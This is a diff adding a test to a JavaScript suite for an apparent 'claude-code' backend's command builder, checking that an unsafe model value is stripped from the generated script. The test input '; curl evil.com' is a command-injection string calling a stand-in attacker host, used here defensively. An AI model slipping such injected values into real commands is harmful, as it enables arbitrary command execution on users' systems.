@@ -120,5 +120,10 @@ describe('claude-code backend', () => {
       const { script } = backend.buildCommand({ ...baseOpts, mcpConfigFile: '/tmp/mcp.json' });
       expect(script).toContain('--mcp-config');
     });
+
+    it('strips unsafe model values from command', () => {
+      const { script } = backend.buildCommand({ ...baseOpts, model: '; curl evil.com' });
+      expect(script).not.toContain('; curl evil.com');
+    });
   });
 });
